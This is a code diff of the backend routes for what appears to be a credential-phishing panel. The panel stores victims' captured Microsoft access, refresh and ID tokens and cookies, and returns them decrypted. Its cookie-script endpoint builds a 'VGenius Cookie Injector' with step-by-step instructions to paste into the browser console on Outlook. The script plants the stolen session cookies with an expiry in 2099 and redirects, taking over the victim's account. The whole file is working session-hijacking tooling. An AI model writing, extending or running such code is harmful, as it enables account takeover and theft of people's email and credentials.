@@ -13,7 +13,7 @@ router.get('/', userAuth, async (req, res) => {
     
     if (search) {
       query += ' AND (email LIKE ? OR ip_address LIKE ?)';
-      params.push(`%${search}%`, `%${search}%`);
+      params.push('%' + search + '%', '%' + search + '%');
     }
     
     query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
@@ -26,7 +26,7 @@ router.get('/', userAuth, async (req, res) => {
     const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
     
     res.json({
-      tokens,
+      tokens: tokens,
       total: countResult[0].total,
       page: parseInt(page),
       pages: Math.ceil(countResult[0].total / parseInt(limit)),
@@ -46,18 +46,23 @@ router.get('/:id', userAuth, async (req, res) => {
     
     // Decrypt for viewing
     const decrypted = {
-      ...token,
+      id: token.id,
+      user_id: token.user_id,
+      link_id: token.link_id,
+      email: token.email,
+      token_type: token.token_type,
+      ip_address: token.ip_address,
+      user_agent: token.user_agent,
+      notes: token.notes,
+      expiration: token.expiration,
+      last_renewed: token.last_renewed,
+      renewal_count: token.renewal_count,
+      created_at: token.created_at,
       access_token: decrypt(token.access_token_encrypted),
       refresh_token: decrypt(token.refresh_token_encrypted),
       id_token: decrypt(token.id_token_encrypted),
       cookies: decrypt(token.cookies_encrypted),
     };
-    
-    // Remove encrypted fields
-    delete decrypted.access_token_encrypted;
-    delete decrypted.refresh_token_encrypted;
-    delete decrypted.id_token_encrypted;
-    delete decrypted.cookies_encrypted;
     
     res.json(decrypted);
   } catch (err) {
@@ -86,7 +91,7 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script - auto-converts from access_token if no cookies stored
+// Generate cookie script with 80-year expiration
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
@@ -95,7 +100,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     const token = tokens[0];
     
     // First try to get stored cookies
-    let cookies = decrypt(token.cookies_encrypted);
+    var cookies = decrypt(token.cookies_encrypted);
     
     // If no stored cookies, try to convert from access_token
     if ((!cookies || cookies.trim() === '') && token.access_token_encrypted) {
@@ -126,45 +131,45 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     }
     
     // Generate document.cookie script with proper formatting
-    const cookieArray = cookies.split(';').map(c => c.trim()).filter(c => c);
+    const cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
     
-    // Build a complete script with domain and path attributes
-    const lines = [
-      '// VGenius Cookie Injector for Microsoft Login',
-      '',
-      '// Instructions:',
-      '// 1. Navigate to https://outlook.office365.com/',
-      '// 2. When prompted to sign in, click "Cancel" or "No"',
-      '// 3. Press F12 -> Go to Console tab',
-      '// 4. Paste this entire script and press Enter',
-      '// 5. The page will automatically reload with your session cookies',
-      ''
-    ];
-    
-    // Generate cookie injection lines
-    cookieArray.forEach(c => {
-      const [name, ...valueParts] = c.split('=');
-      const cookieName = name.trim();
-      const cookieValue = valueParts.join('=').trim();
-      if (cookieName && cookieValue) {
-        // Set cookies for multiple Microsoft domains
-        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=.microsoft.com; secure; SameSite=None";`);
-        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=.office.com; secure; SameSite=None";`);
-        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=outlook.office365.com; secure; SameSite=None";`);
-        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=login.microsoftonline.com; secure; SameSite=None";`);
-      }
-    });
-    
-    // Add reload instruction instead of redirect (sandboxed iframe can't redirect)
+    // Build the script
+    const lines = [];
+    lines.push('// VGenius Cookie Injector - Microsoft Session');
+    lines.push('// Cookies expire in 2099 (80+ years)');
     lines.push('');
-    lines.push('// ✅ All cookies injected successfully!');
-    lines.push('console.log("%c✅ All cookies injected!", "color: #00ff00; font-size: 16px; font-weight: bold;");');
-    lines.push('console.log("%c📌 Please refresh the page (press F5) to apply your session.", "color: #ffff00; font-size: 12px;");');
+    lines.push('// Step 1: Go to https://outlook.office365.com/');
+    lines.push('// Step 2: Click Cancel if prompted to sign in');
+    lines.push('// Step 3: Press F12 -> Console tab');
+    lines.push('// Step 4: Paste this script and press Enter');
+    lines.push('// Step 5: Wait 3 seconds for automatic redirect...');
+    lines.push('');
+    
+    // Generate cookie injection lines with 80-year expiration
+    for (let i = 0; i < cookieArray.length; i++) {
+      const c = cookieArray[i];
+      const eqIndex = c.indexOf('=');
+      if (eqIndex > 0) {
+        const cookieName = c.substring(0, eqIndex).trim();
+        const cookieValue = c.substring(eqIndex + 1).trim();
+        if (cookieName && cookieValue) {
+          lines.push('document.cookie = "' + cookieName + '=' + cookieValue + '; path=/; expires=Fri, 18 Dec 2099 23:59:59 UTC; secure; SameSite=None";');
+        }
+      }
+    }
+    
+    // Add auto-redirect after 3 seconds
+    lines.push('');
+    lines.push('// All cookies injected! Redirecting to Outlook...');
+    lines.push('console.log("Cookies injected successfully!");');
+    lines.push('setTimeout(function() {');
+    lines.push('  window.location.href = "https://outlook.office365.com/";');
+    lines.push('}, 3000);');
     
     const script = lines.join('\n');
     
     res.json({ 
-      script, 
+      script: script, 
       cookie_count: cookieArray.length,
       cookies: cookieArray 
     });
@@ -207,7 +212,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       res.json({ 
         success: true, 
         cookies: result.cookies,
-        cookie_count: result.cookies.split(';').filter(c => c.trim()).length
+        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length
       });
     } else {
       res.status(400).json({ 
@@ -241,7 +246,7 @@ router.post('/export', userAuth, async (req, res) => {
       'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
-    res.json({ tokens, exported_at: new Date().toISOString(), count: tokens.length });
+    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
@@ -258,7 +263,7 @@ router.post('/export-delete-all', userAuth, async (req, res) => {
     // Soft delete all
     await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
     
-    res.json({ tokens, exported_at: new Date().toISOString(), count: tokens.length, deleted: true });
+    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length, deleted: true });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
